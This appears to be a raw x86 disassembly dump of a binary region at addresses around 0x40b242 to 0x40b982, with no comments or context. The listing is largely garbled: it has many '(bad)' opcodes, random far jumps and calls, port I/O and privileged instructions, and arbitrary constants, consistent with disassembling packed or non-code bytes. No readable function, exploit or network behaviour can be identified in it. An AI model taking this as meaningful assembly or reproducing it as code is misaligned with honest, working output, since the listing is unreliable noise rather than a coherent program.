  40b242:	fiadd  WORD PTR [esp+ebp*4+0x1a]
  40b246:	mov    ah,bh
  40b248:	cmc    
  40b249:	xchg   esp,eax
  40b24a:	inc    ebp
  40b24b:	mov    eax,0x27a1cf80
  40b250:	cmp    DWORD PTR [edx],edi
  40b252:	popa   
  40b253:	xchg   BYTE PTR [ebx+0x5a06376d],dl
  40b259:	mov    esi,0x52b2afe3
  40b25e:	test   DWORD PTR [esi+0x5cb522e0],0x3625ccff
  40b268:	cmp    eax,0x4c3a3f4a
  40b26d:	(bad)  
  40b26e:	inc    BYTE PTR [esi-0x5d]
  40b271:	push   ds
  40b272:	jnp    0x40b2cb
  40b274:	xchg   ecx,eax
  40b275:	cwde   
  40b276:	aam    0x4d
  40b278:	cmc    
  40b279:	clc    
  40b27a:	sub    eax,0x3d5b99af
  40b27f:	add    ch,BYTE PTR ds:0x9efa4082
  40b285:	jmp    0xcd9df6ad
  40b28a:	mov    ebp,0x5ee43af9
  40b28f:	aas    
  40b290:	push   ecx
  40b291:	js     0x40b254
  40b293:	imul   eax,DWORD PTR cs:[esi+0x48],0x964e0fea
  40b29b:	das    
  40b29c:	sbb    DWORD PTR [ebx],0xb22c898
  40b2a2:	fld1   
  40b2a4:	icebp  
  40b2a5:	jle    0x40b2c8
  40b2a7:	nop
  40b2a8:	cwde   
  40b2a9:	push   cs
  40b2aa:	idiv   BYTE PTR [edx]
  40b2ac:	lods   eax,DWORD PTR ds:[esi]
  40b2ad:	lds    ecx,FWORD PTR [eax]
  40b2af:	call   DWORD PTR [eax+0x3]
  40b2b2:	push   es
  40b2b3:	jp     0x40b245
  40b2b5:	ficom  DWORD PTR [ebx+0x508a2b34]
  40b2bb:	scas   eax,DWORD PTR es:[edi]
  40b2bc:	xor    edi,DWORD PTR [edi-0x7e]
  40b2bf:	repz xchg esi,eax
  40b2c1:	sbb    BYTE PTR [edi],ch
  40b2c3:	adc    eax,0xd0731077
  40b2c8:	inc    edx
  40b2c9:	sub    edx,DWORD PTR [ecx-0xf39e713]
  40b2cf:	cld    
  40b2d0:	xor    eax,edi
  40b2d2:	xor    edx,edx
  40b2d4:	or     eax,edx
  40b2d6:	lea    eax,[ebp+eax*1-0x4]
  40b2da:	jmp    0x40b864
  40b2df:	dec    esp
  40b2e0:	outs   dx,DWORD PTR ds:[esi]
  40b2e1:	cdq    
  40b2e2:	js     0x40b27c
  40b2e4:	cmp    BYTE PTR [ebx+edx*1],ch
  40b2e7:	mov    ah,0x21
  40b2e9:	mov    al,0xae
  40b2eb:	add    eax,eax
  40b2ed:	data16 outs dx,BYTE PTR ds:[esi]
  40b2ef:	mov    edx,0x3d1616ff
  40b2f4:	add    al,0x16
  40b2f6:	push   ss
  40b2f7:	stos   BYTE PTR es:[edi],al
  40b2f8:	mov    bh,0xf
  40b2fa:	ss inc edi
  40b2fc:	add    BYTE PTR [esi+0x26],bl
  40b2ff:	mov    BYTE PTR [edi-0x44],al
  40b302:	xchg   esp,eax
  40b303:	jbe    0x40b2ca
  40b305:	sbb    eax,0x1e6138c8
  40b30a:	xchg   BYTE PTR [eax+0xa],bh
  40b30d:	inc    esi
  40b30e:	inc    ebx
  40b30f:	adc    esp,DWORD PTR [ebp-0x5639a9d0]
  40b315:	sbb    BYTE PTR [ecx-0x64],ah
  40b318:	mov    ds:0x73b051ee,al
  40b31d:	fbld   TBYTE PTR [ebp-0x73]
  40b320:	mov    bl,BYTE PTR [eax+0x11]
  40b323:	sub    ebp,esi
  40b325:	dec    esi
  40b326:	dec    esi
  40b327:	stc    
  40b328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b329:	rcl    DWORD PTR [edi],0x52
  40b32c:	ficomp DWORD PTR [edi-0x37]
  40b32f:	ins    BYTE PTR es:[edi],dx
  40b330:	add    BYTE PTR [ecx-0x476b3fb2],dh
  40b336:	dec    esi
  40b337:	sbb    BYTE PTR [eax+0x2d4a4e0a],al
  40b33d:	fsubr  QWORD PTR [edx-0x31]
  40b340:	xchg   edx,eax
  40b341:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40b343:	xchg   esi,eax
  40b344:	outs   dx,BYTE PTR ds:[esi]
  40b345:	and    ah,BYTE PTR [esp+eiz*2]
  40b348:	idiv   BYTE PTR [ebp+0x51]
  40b34b:	sub    DWORD PTR [ecx],ebp
  40b34d:	sub    al,0x6
  40b34f:	sub    ch,al
  40b351:	xchg   edx,eax
  40b352:	jecxz  0x40b3b1
  40b354:	and    BYTE PTR [ecx+0x3d],dh
  40b357:	into   
  40b358:	ins    BYTE PTR es:[edi],dx
  40b359:	xor    BYTE PTR [edx],ch
  40b35b:	hlt    
  40b35c:	sbb    DWORD PTR [ebp-0x1f3e1376],0xae1d7ea6
  40b366:	fwait
  40b367:	xor    BYTE PTR [eax+0x13],dl
  40b36a:	cdq    
  40b36b:	or     edx,0x2abc01c9
  40b371:	(bad)  
  40b372:	mov    esp,0x1f48dad2
  40b377:	cmp    eax,DWORD PTR [eax+edi*2-0x15a95cbb]
  40b37e:	dec    edi
  40b37f:	das    
  40b380:	push   cs
  40b381:	push   esi
  40b382:	fcom   QWORD PTR [edx]
  40b384:	sbb    dh,BYTE PTR [eax]
  40b386:	dec    esp
  40b387:	pushf  
  40b388:	cmc    
  40b389:	adc    DWORD PTR [ecx],esp
  40b38b:	jns    0x40b38f
  40b38d:	push   ss
  40b38e:	lea    edx,[eax+0x6d]
  40b391:	and    esi,DWORD PTR [edx-0xb]
  40b394:	loopne 0x40b31c
  40b396:	loope  0x40b416
  40b398:	mov    esp,esp
  40b39a:	xchg   edx,eax
  40b39b:	add    esi,DWORD PTR [edi]
  40b39d:	pop    eax
  40b39e:	daa    
  40b39f:	pop    ds
  40b3a0:	mov    BYTE PTR [ecx-0x4a99ec9d],bh
  40b3a6:	xor    DWORD PTR [eax+0x64],edx
  40b3a9:	bswap  ecx
  40b3ab:	jmp    0x110e9b26
  40b3b0:	or     BYTE PTR [ebx],dh
  40b3b2:	in     eax,0x1e
  40b3b4:	out    0x14,eax
  40b3b6:	loope  0x40b3ca
  40b3b8:	cs out 0xbd,eax
  40b3bb:	add    al,0x60
  40b3bd:	shl    DWORD PTR [esi+0x64],1
  40b3c0:	push   edx
  40b3c1:	retf   
  40b3c2:	xor    esp,edx
  40b3c4:	push   0x3bccc76c
  40b3c9:	lock stos BYTE PTR es:[edi],al
  40b3cb:	ret    
  40b3cc:	push   edi
  40b3cd:	push   ecx
  40b3ce:	sbb    edx,DWORD PTR [ebp-0x3a]
  40b3d1:	mov    gs,WORD PTR ds:0x58ddd8fa
  40b3d7:	dec    ebp
  40b3d8:	sbb    edi,0x4844ee14
  40b3de:	mov    cl,0xc3
  40b3e0:	and    BYTE PTR [eax+0x54],cl
  40b3e3:	cmp    DWORD PTR [ebp-0x68062dab],edx
  40b3e9:	pop    ss
  40b3ea:	in     al,dx
  40b3eb:	test   eax,0xdc44042c
  40b3f0:	fs push 0xe05968d9
  40b3f6:	ins    DWORD PTR es:[edi],dx
  40b3f7:	test   DWORD PTR [edx+esi*1-0x79],edx
  40b3fb:	stc    
  40b3fc:	rol    BYTE PTR ds:0x43bb32e2,cl
  40b402:	sbb    bl,bl
  40b404:	dec    ecx
  40b405:	jge    0x40b440
  40b407:	ins    BYTE PTR es:[edi],dx
  40b408:	jns    0x40b405
  40b40a:	jg     0x40b43a
  40b40c:	jle    0x40b427
  40b40e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b40f:	retf   0x79f9
  40b412:	(bad)  
  40b413:	lahf   
  40b414:	pop    ecx
  40b415:	aas    
  40b416:	das    
  40b417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b418:	mov    ebx,0xdee71230
  40b41d:	into   
  40b41e:	add    dl,ah
  40b420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b421:	dec    ecx
  40b422:	sbb    ecx,DWORD PTR [eax-0x5b97baa1]
  40b428:	nop
  40b429:	sbb    ch,al
  40b42b:	push   0xffffff8f
  40b42d:	call   0xd1bdb30a
  40b432:	lea    ecx,[ecx+eiz*8+0x3a40091e]
  40b439:	fidivr WORD PTR [ebp-0x5c965ed6]
  40b43f:	stc    
  40b440:	inc    ebp
  40b441:	and    ah,al
  40b443:	retf   
  40b444:	inc    edi
  40b445:	in     al,dx
  40b446:	(bad)  
  40b447:	ins    BYTE PTR es:[edi],dx
  40b448:	int3   
  40b449:	xchg   esi,eax
  40b44a:	and    esp,DWORD PTR [ecx-0x1020b8a9]
  40b450:	mov    ch,0xa
  40b452:	cmp    BYTE PTR [edx],cl
  40b454:	lahf   
  40b455:	mov    esi,0x74913e0f
  40b45a:	in     al,dx
  40b45b:	ffree  st(3)
  40b45d:	repnz cdq 
  40b45f:	fild   QWORD PTR [edx]
  40b461:	adc    al,0x6
  40b463:	push   esi
  40b464:	sub    eax,0xc3910bba
  40b469:	dec    edi
  40b46a:	(bad)  
  40b46b:	stc    
  40b46c:	leave  
  40b46d:	push   eax
  40b46e:	cmp    BYTE PTR [ecx-0x4bb9f12e],ah
  40b474:	stos   DWORD PTR es:[edi],eax
  40b475:	mov    ebx,0x1349d0a0
  40b47a:	jnp    0x40b499
  40b47c:	xor    eax,0x6107d479
  40b481:	mov    dl,0xa4
  40b483:	test   al,0xd2
  40b485:	mov    eax,0xb7e6cbd3
  40b48a:	xchg   edx,eax
  40b48b:	arpl   WORD PTR [esi],dx
  40b48d:	dec    ecx
  40b48e:	cmp    BYTE PTR ds:0x4e253bce,bl
  40b494:	ins    DWORD PTR es:[edi],dx
  40b495:	add    eax,0x20702c3b
  40b49a:	in     al,dx
  40b49b:	test   al,0x49
  40b49d:	and    BYTE PTR [ebx+0x5d1b76cf],0x13
  40b4a4:	test   al,0x96
  40b4a6:	and    DWORD PTR [esi],esp
  40b4a8:	add    ecx,eax
  40b4aa:	das    
  40b4ab:	cwde   
  40b4ac:	xchg   bp,ax
  40b4ae:	ror    edi,1
  40b4b0:	sub    BYTE PTR [ebp+0x45],0x56
  40b4b4:	lahf   
  40b4b5:	inc    esi
  40b4b6:	jp     0x40b4ff
  40b4b8:	sub    BYTE PTR [ebx-0x7a],ah
  40b4bb:	push   0x26
  40b4bd:	loopne 0x40b445
  40b4bf:	mov    ch,0x73
  40b4c1:	and    ebx,0x57
  40b4c4:	ds popa 
  40b4c6:	pop    edx
  40b4c7:	in     al,0x4
  40b4c9:	fdivrp st(4),st
  40b4cb:	inc    edi
  40b4cc:	mov    ss,eax
  40b4ce:	sub    al,0x61
  40b4d0:	pop    esi
  40b4d1:	jno    0x40b4f2
  40b4d3:	call   0x4254:0xc5526b8
  40b4da:	loop   0x40b4ba
  40b4dc:	rcr    esi,0x6
  40b4df:	(bad)  
  40b4e0:	or     esi,DWORD PTR [ebx+0x113290f5]
  40b4e6:	mov    dl,0xdf
  40b4e8:	push   0x1896c062
  40b4ed:	out    dx,al
  40b4ee:	inc    ebp
  40b4ef:	test   DWORD PTR [edx+0x3a39a8d3],ebx
  40b4f5:	pusha  
  40b4f6:	aas    
  40b4f7:	ud0    eax,DWORD PTR [esi+0x6234ea62]
  40b4fe:	mov    ds:0xe985415,al
  40b504:	mov    al,ds:0xbf9bede4
  40b509:	ins    BYTE PTR es:[edi],dx
  40b50a:	mov    WORD PTR [edi-0xa3c96d7],cs
  40b510:	in     eax,dx
  40b511:	xchg   DWORD PTR [ecx-0x6a],esp
  40b514:	jecxz  0x40b498
  40b516:	repnz mov eax,ds:0xa01efb15
  40b51c:	push   es
  40b51d:	xor    eax,0xb579541d
  40b522:	sbb    BYTE PTR [ebp+0x56a9f408],dh
  40b528:	sub    DWORD PTR [esi+0xf],esp
  40b52b:	in     al,dx
  40b52c:	push   es
  40b52d:	test   al,0xff
  40b52f:	push   eax
  40b530:	xor    bl,BYTE PTR [ecx]
  40b532:	xchg   esi,eax
  40b533:	test   DWORD PTR ds:0x224afe03,esp
  40b539:	cli    
  40b53a:	push   ds
  40b53b:	inc    ecx
  40b53c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b53d:	dec    ecx
  40b53e:	stc    
  40b53f:	lock inc ebx
  40b541:	cs xchg esp,eax
  40b543:	cmp    edi,esp
  40b545:	pop    esi
  40b546:	jmp    0x3b85c902
  40b54b:	xor    edi,ebp
  40b54d:	mov    eax,0xc997c5a9
  40b552:	aas    
  40b553:	push   ebp
  40b554:	mov    DWORD PTR [ecx-0x3d04c16d],esi
  40b55a:	ret    0x82df
  40b55d:	xor    ch,BYTE PTR [esi+0x3388bcbd]
  40b563:	jle    0x40b5db
  40b565:	or     esp,ecx
  40b567:	(bad)
  40b56b:	loop   0x40b55e
  40b56d:	push   eax
  40b56e:	adc    ebx,DWORD PTR [eax-0x4a614887]
  40b574:	sbb    BYTE PTR cs:[ecx-0x1444491d],dl
  40b57b:	push   ebp
  40b57c:	gs add eax,0x59043465
  40b582:	xchg   ebx,ebx
  40b584:	jmp    0x40b574
  40b586:	sub    DWORD PTR [ebx-0x79],esp
  40b589:	cmp    BYTE PTR [ebx-0x2f],ch
  40b58c:	mov    esi,0x1e0f3b2d
  40b591:	dec    ebp
  40b592:	jo     0x40b54a
  40b594:	xchg   esi,eax
  40b595:	jne    0x40b5a6
  40b597:	rcr    BYTE PTR [edx],cl
  40b599:	ds dec ebx
  40b59b:	aam    0xc1
  40b59d:	pop    ebx
  40b59e:	in     al,0x2e
  40b5a0:	int3   
  40b5a1:	stos   BYTE PTR es:[edi],al
  40b5a2:	mov    cl,0xd6
  40b5a4:	(bad)  
  40b5a5:	ins    DWORD PTR es:[edi],dx
  40b5a6:	jne    0x40b5e2
  40b5a8:	push   ebx
  40b5a9:	and    DWORD PTR [eax+0x29],ebx
  40b5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ad:	jge    0x40b589
  40b5af:	jbe    0x40b5b7
  40b5b1:	inc    ebx
  40b5b2:	fmulp  st(7),st
  40b5b4:	mov    ds:0x6f32d3a8,al
  40b5b9:	cmp    BYTE PTR [edx-0x1f],al
  40b5bc:	or     al,0x64
  40b5be:	fwait
  40b5bf:	call   0xeb908937
  40b5c4:	cdq    
  40b5c5:	shl    eax,1
  40b5c7:	pop    esp
  40b5c8:	inc    edx
  40b5c9:	stos   DWORD PTR es:[di],eax
  40b5cb:	dec    ebp
  40b5cc:	inc    esp
  40b5cd:	dec    esi
  40b5ce:	jnp    0x40b5ec
  40b5d0:	outs   dx,BYTE PTR ds:[esi]
  40b5d1:	jnp    0x40b5aa
  40b5d3:	pop    eax
  40b5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5d5:	out    dx,al
  40b5d6:	dec    ebx
  40b5d8:	mov    ecx,0x500f1c96
  40b5dd:	add    al,0x30
  40b5df:	(bad)
  40b5e2:	data16 mov bl,0x73
  40b5e5:	push   ebx
  40b5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e7:	or     eax,0x85eceba
  40b5ec:	xchg   edx,eax
  40b5ed:	mov    ch,0xa
  40b5ef:	test   al,0xfa
  40b5f1:	ret    
  40b5f2:	rcr    BYTE PTR [ecx-0x39],cl
  40b5f5:	stc    
  40b5f6:	lock push ebx
  40b5f8:	cmp    al,0xa0
  40b5fa:	pop    ebp
  40b5fb:	or     al,0x54
  40b5fd:	push   ss
  40b5fe:	test   eax,0xf46b77ec
  40b603:	xchg   ecx,eax
  40b604:	in     al,0xaa
  40b606:	jecxz  0x40b5a3
  40b608:	xchg   BYTE PTR [esi],dh
  40b60a:	mov    WORD PTR [ecx],cs
  40b60c:	adc    DWORD PTR [edx-0x470a85d4],ecx
  40b612:	leave  
  40b613:	les    edx,FWORD PTR [ebp+0x5fa9f4a1]
  40b619:	repz mov edi,0xdf4a5e45
  40b61f:	nop
  40b620:	adc    al,0x80
  40b622:	aas    
  40b623:	les    ebp,FWORD PTR [ebp+0x1e]
  40b626:	pop    ss
  40b627:	and    al,0x71
  40b629:	adc    DWORD PTR [eax+0x35],ecx
  40b62c:	mov    DWORD PTR [edx],eax
  40b62e:	cld    
  40b62f:	(bad)
  40b632:	adc    cl,BYTE PTR [ebx+0x6761a382]
  40b638:	and    BYTE PTR [eax+esi*1-0x38],cl
  40b63c:	rol    dl,cl
  40b63e:	call   0x304d:0xa2a445da
  40b645:	frstpm(287 only) 
  40b647:	add    DWORD PTR [esi+eax*8+0x19dfb0f7],ecx
  40b64e:	in     eax,dx
  40b64f:	nop
  40b650:	inc    esp
  40b651:	cmp    dh,BYTE PTR [ebx]
  40b653:	aad    0x5e
  40b655:	xchg   ebx,eax
  40b656:	popa   
  40b657:	scas   al,BYTE PTR es:[edi]
  40b658:	jmp    0x27fbf2b8
  40b65d:	dec    BYTE PTR [ebx+edi*8+0x64]
  40b661:	sahf   
  40b662:	dec    ecx
  40b663:	cdq    
  40b664:	out    0xc3,eax
  40b666:	sahf   
  40b667:	mov    al,0x95
  40b669:	jle    0x40b696
  40b66b:	sub    DWORD PTR [ebp-0x7825a18a],eax
  40b671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b673:	cmp    bh,dl
  40b675:	xchg   edx,eax
  40b676:	sbb    ecx,DWORD PTR [edi+esi*1-0x2716a6da]
  40b67d:	cmp    al,0xe5
  40b67f:	xor    eax,0x42f58809
  40b684:	mov    esi,0x13efaa9b
  40b689:	mov    WORD PTR [eax+0x7f],fs
  40b68c:	out    dx,eax
  40b68d:	fdiv   QWORD PTR [bp+si-0x65]
  40b691:	scas   eax,DWORD PTR es:[edi]
  40b692:	sbb    DWORD PTR [ecx+0x45],0xffffffd7
  40b696:	push   esi
  40b697:	mov    ds:0x479795b7,al
  40b69c:	jns    0x40b62e
  40b69e:	sub    DWORD PTR [esi+ebx*8],eax
  40b6a1:	dec    esp
  40b6a2:	sar    BYTE PTR [eax-0x324b6feb],1
  40b6a8:	sti    
  40b6a9:	daa    
  40b6aa:	mov    al,0xc4
  40b6ac:	xchg   esi,eax
  40b6ad:	addr16 push ds
  40b6af:	sbb    BYTE PTR [esi+0x19],cl
  40b6b2:	imul   esp,DWORD PTR [edx],0x63
  40b6b5:	retf   0x396e
  40b6b8:	sbb    eax,0x639af2fe
  40b6bd:	test   BYTE PTR [ecx-0x730ad00c],cl
  40b6c3:	mov    bl,0xa0
  40b6c5:	push   0x6f
  40b6c7:	ficomp DWORD PTR [ecx+ebp*4]
  40b6ca:	push   0x76
  40b6cc:	dec    ebx
  40b6cd:	jmp    0x40b654
  40b6cf:	sub    eax,0xb22102e3
  40b6d4:	ja     0x40b6a6
  40b6d6:	xchg   esi,eax
  40b6d7:	mov    WORD PTR [ebx],?
  40b6d9:	rcl    ebp,0xd6
  40b6dc:	daa    
  40b6dd:	cmc    
  40b6de:	aam    0x53
  40b6e0:	lock pop edx
  40b6e2:	mov    DWORD PTR [edx+0x664c5b],esp
  40b6e8:	sbb    BYTE PTR [ebx+ebp*2+0x2],ch
  40b6ec:	gs pop ebp
  40b6ee:	mov    WORD PTR [edi+0x44c34af7],gs
  40b6f4:	sti    
  40b6f5:	mov    al,ds:0x834f7136
  40b6fa:	cdq    
  40b6fb:	mov    ch,0x7d
  40b6fd:	fdiv   QWORD PTR [eax]
  40b6ff:	push   ds
  40b700:	sbb    ebp,edi
  40b702:	shl    DWORD PTR [ecx-0x52],1
  40b705:	push   edi
  40b706:	popa   
  40b707:	or     DWORD PTR [ecx],ebp
  40b709:	jb     0x40b6a2
  40b70b:	ret    0x70cb
  40b70e:	(bad)  
  40b712:	sub    al,BYTE PTR [edi+0x7d54d377]
  40b718:	inc    ebx
  40b719:	es leave 
  40b71b:	cmp    BYTE PTR [edi-0x75],al
  40b71e:	inc    esp
  40b71f:	or     ebp,DWORD PTR [eax-0x4811c151]
  40b725:	and    ecx,DWORD PTR [esi+0x25b2228e]
  40b72b:	cld    
  40b72c:	or     al,0x96
  40b72e:	xchg   edx,eax
  40b72f:	icebp  
  40b730:	dec    ecx
  40b731:	iret   
  40b732:	pusha  
  40b733:	sbb    BYTE PTR [ebx+0x63],cl
  40b736:	pop    ss
  40b737:	idiv   DWORD PTR [ecx]
  40b739:	inc    esi
  40b73a:	mov    eax,ds:0x5f3d05af
  40b73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b740:	pop    edi
  40b741:	mov    esi,0xfc02f02d
  40b746:	test   BYTE PTR [ecx+0x50],dl
  40b749:	leave  
  40b74a:	inc    edx
  40b74b:	sbb    al,0xd1
  40b74d:	rcr    DWORD PTR [eax+0x6c0c6704],1
  40b753:	cs mov eax,0xfacb63c7
  40b759:	in     al,0x96
  40b75b:	adc    BYTE PTR [esi+0x25ad97ec],dl
  40b761:	test   DWORD PTR [esi],esp
  40b763:	(bad)  
  40b764:	lahf   
  40b765:	sub    cl,cl
  40b767:	and    al,0x5d
  40b769:	nop
  40b76a:	outs   dx,DWORD PTR ds:[esi]
  40b76b:	enter  0x5150,0xac
  40b76f:	mov    edi,0xefc408fe
  40b774:	sub    al,0x1a
  40b776:	call   0xdc546ce5
  40b77b:	and    ebx,DWORD PTR cs:[ecx-0x6b00db85]
  40b782:	pop    esi
  40b783:	lods   eax,DWORD PTR ds:[esi]
  40b784:	das    
  40b785:	pop    edi
  40b786:	cmp    BYTE PTR [ecx],ch
  40b788:	sub    al,0xe
  40b78a:	lds    edx,FWORD PTR ds:0x46515307
  40b790:	mov    ebx,DWORD PTR [edx-0x10]
  40b793:	cdq    
  40b794:	pop    edi
  40b795:	xor    edi,esp
  40b797:	cmp    DWORD PTR [edi-0x59],esp
  40b79a:	popf   
  40b79b:	std    
  40b79c:	pop    esp
  40b79d:	leave  
  40b79e:	pop    es
  40b79f:	fimul  DWORD PTR [edx+0x2e71f092]
  40b7a5:	adc    ebp,esi
  40b7a7:	jecxz  0x40b7f5
  40b7a9:	rcr    BYTE PTR [esi],cl
  40b7ab:	cli    
  40b7ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7ad:	and    DWORD PTR [edx],ecx
  40b7af:	addr16 mov ah,0x16
  40b7b2:	mov    WORD PTR [edx-0x7f6c2231],cs
  40b7b8:	jb     0x40b771
  40b7ba:	xchg   ebx,eax
  40b7bb:	mov    al,0x9b
  40b7bd:	and    edx,DWORD PTR [ebp-0x53]
  40b7c0:	les    ecx,FWORD PTR [ecx-0x64edad0f]
  40b7c6:	cmp    ah,BYTE PTR [ecx]
  40b7c8:	data16 cld 
  40b7ca:	std    
  40b7cb:	fnstcw WORD PTR [ecx-0x71]
  40b7ce:	mov    dh,0x5d
  40b7d0:	or     al,0xdc
  40b7d2:	or     ecx,ebp
  40b7d4:	sbb    dh,BYTE PTR [ebp-0x53]
  40b7d7:	mov    es,WORD PTR [edi-0x49c7140e]
  40b7dd:	dec    edi
  40b7de:	inc    ebx
  40b7df:	pop    es
  40b7e0:	add    DWORD PTR [eax-0x5980c11],0x23
  40b7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7e8:	mov    dh,0xa7
  40b7ea:	jl     0x40b76e
  40b7ec:	jle    0x40b7de
  40b7ee:	fimul  DWORD PTR [esi-0x6fd43a3]
  40b7f4:	dec    ebx
  40b7f5:	dec    eax
  40b7f6:	xor    edi,edi
  40b7f8:	stc    
  40b7f9:	ret    
  40b7fa:	loop   0x40b85d
  40b7fc:	aas    
  40b7fd:	xor    eax,0xf1f805ca
  40b802:	fadd   st,st(2)
  40b804:	lods   eax,DWORD PTR ds:[esi]
  40b805:	cmc    
  40b806:	sub    al,0x79
  40b808:	sub    al,0x21
  40b80a:	dec    edi
  40b80b:	adc    eax,0x63f7c089
  40b810:	add    dl,bh
  40b812:	dec    edi
  40b813:	(bad)  
  40b814:	mov    ch,0xfc
  40b816:	lods   eax,DWORD PTR ds:[esi]
  40b817:	xor    al,0x12
  40b819:	stos   DWORD PTR es:[edi],eax
  40b81a:	mov    ah,0x3d
  40b81c:	jg     0x40b807
  40b81e:	enter  0xa600,0x2d
  40b822:	cmp    DWORD PTR [edx+0xf],0xfffffff8
  40b826:	pop    eax
  40b827:	push   edi
  40b828:	xor    esi,DWORD PTR [edi]
  40b82a:	sbb    al,0x6
  40b82c:	add    BYTE PTR [esp+eiz*2+0xc],ch
  40b830:	ss jns 0x40b890
  40b833:	fucomi st,st(0)
  40b835:	dec    edx
  40b836:	push   ebx
  40b837:	mov    ds:0x77200069,eax
  40b83c:	push   edx
  40b83d:	and    DWORD PTR [eax+0x3e],esi
  40b840:	adc    cl,BYTE PTR [ebx+0x4377523]
  40b846:	sbb    eax,DWORD PTR fs:[edi-0x5cf9d357]
  40b84d:	push   ds
  40b84e:	xchg   dh,cl
  40b850:	xchg   esp,eax
  40b851:	inc    esp
  40b852:	xor    DWORD PTR [edi+0x276d7cd8],ebx
  40b858:	pusha  
  40b859:	out    0x40,eax
  40b85b:	sub    BYTE PTR [ecx+0x388b6d00],bl
  40b861:	cld    
  40b862:	and    ebx,DWORD PTR [ecx+ecx*4+0x45]
  40b866:	int3   
  40b867:	mov    eax,DWORD PTR [ebp-0x60]
  40b86a:	shl    ecx,0x1e
  40b86d:	mov    ecx,DWORD PTR [ebp-0x5c]
  40b870:	jmp    0x40bdfa
  40b875:	retf   
  40b876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b877:	cli    
  40b878:	jo     0x40b852
  40b87a:	sbb    BYTE PTR [eax],ah
  40b87c:	and    al,0xe8
  40b87e:	ins    BYTE PTR es:[edi],dx
  40b87f:	mov    ah,0x72
  40b881:	aad    0xe1
  40b883:	mov    eax,0x16ebf072
  40b888:	push   ss
  40b889:	cmp    eax,0x3a161604
  40b88e:	sub    bl,BYTE PTR [ebx-0x24]
  40b891:	sub    cl,BYTE PTR [ecx+0x76b8fd46]
  40b897:	fdiv   st,st(6)
  40b899:	pop    edx
  40b89a:	iret   
  40b89b:	ds fwait
  40b89d:	xchg   edi,eax
  40b89e:	dec    ebx
  40b89f:	xlat   BYTE PTR ds:[ebx]
  40b8a0:	cmp    al,0x41
  40b8a2:	or     eax,0x124b0fed
  40b8a7:	call   0x31a0f1ca
  40b8ac:	mov    BYTE PTR [edx],al
  40b8ae:	xchg   ebp,eax
  40b8af:	jne    0x40b874
  40b8b1:	(bad)  
  40b8b2:	fisttp QWORD PTR [edx+0xb]
  40b8b5:	clc    
  40b8b6:	ja     0x40b8c5
  40b8b8:	push   esi
  40b8b9:	push   ebx
  40b8ba:	mov    esp,0x322a1b2f
  40b8bf:	dec    edi
  40b8c0:	push   ss
  40b8c1:	jb     0x40b8df
  40b8c3:	sub    eax,0x9a39e2ae
  40b8c8:	mov    ebx,0x15b9f66b
  40b8cd:	fld    QWORD PTR [esi+0x5d]
  40b8d0:	ds cmp dl,ah
  40b8d3:	ss test al,0x8
  40b8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8d7:	jbe    0x40b909
  40b8d9:	sar    DWORD PTR [ecx-0x2],1
  40b8dc:	xor    ch,BYTE PTR [ebx]
  40b8de:	or     ax,0xd631
  40b8e2:	mov    ah,0xc3
  40b8e4:	add    BYTE PTR [ebx+0xedac18],cl
  40b8ea:	sub    esi,DWORD PTR [edx+0x1a]
  40b8ed:	sub    ebx,0xbaa8668c
  40b8f3:	cmc    
  40b8f4:	sahf   
  40b8f5:	pop    edx
  40b8f6:	out    dx,al
  40b8f7:	push   es
  40b8f8:	adc    cl,BYTE PTR [esi+ebp*8+0x6ae0a345]
  40b8ff:	iret   
  40b900:	lods   al,BYTE PTR ds:[esi]
  40b901:	mov    bh,0x46
  40b903:	(bad)  
  40b904:	leave  
  40b905:	sbb    al,0x48
  40b907:	pop    ecx
  40b908:	(bad)  [ecx]
  40b90a:	jmp    0x40b8cc
  40b90c:	call   0xb345:0x4af30796
  40b913:	cli    
  40b914:	xchg   edi,eax
  40b915:	pop    ds
  40b916:	mov    edx,0xcd77e194
  40b91b:	dec    esp
  40b91c:	arpl   WORD PTR [ecx-0x68063282],cx
  40b922:	adc    ch,bl
  40b924:	in     al,dx
  40b925:	jle    0x40b8bf
  40b927:	xchg   BYTE PTR [ebx],bh
  40b929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b92a:	sbb    BYTE PTR [edi],ah
  40b92c:	jnp    0x40b962
  40b92e:	mov    bl,0xf8
  40b930:	push   ebp
  40b931:	fsub   st,st(0)
  40b933:	shr    DWORD PTR [edi],cl
  40b935:	aad    0xe5
  40b937:	xchg   cl,cl
  40b939:	fmul   st(7),st
  40b93b:	jmp    0xc0:0x866e9b76
  40b942:	arpl   WORD PTR [ebx+0x41],di
  40b945:	sbb    DWORD PTR [edi+0x4c],0x7
  40b949:	adc    ah,BYTE PTR [edx-0x50]
  40b94c:	iret   
  40b94d:	imul   edi,DWORD PTR [ebx+0x36d06962],0xffffffa4
  40b954:	sub    ecx,DWORD PTR [ecx]
  40b956:	sub    ah,BYTE PTR [eax+ecx*2]
  40b959:	ud1    eax,DWORD PTR [eax-0x2e6fccda]
  40b960:	sub    ecx,DWORD PTR [edi-0x6ace8c04]
  40b966:	pop    edi
  40b967:	enter  0x39e1,0x52
  40b96b:	rcr    DWORD PTR [edi+esi*8],1
  40b96e:	enter  0xd7b4,0x7
  40b972:	inc    ebp
  40b973:	pusha  
  40b974:	stc    
  40b975:	jle    0x40b906
  40b977:	xchg   ecx,eax
  40b978:	push   ecx
  40b979:	mov    al,0xbd
  40b97b:	sbb    al,0xa2
  40b97d:	mov    gs,WORD PTR [ebx+0x63]
  40b980:	push   edx
  40b981:	ret    
  40b982:	(bad)  ds:0x694a2ea4
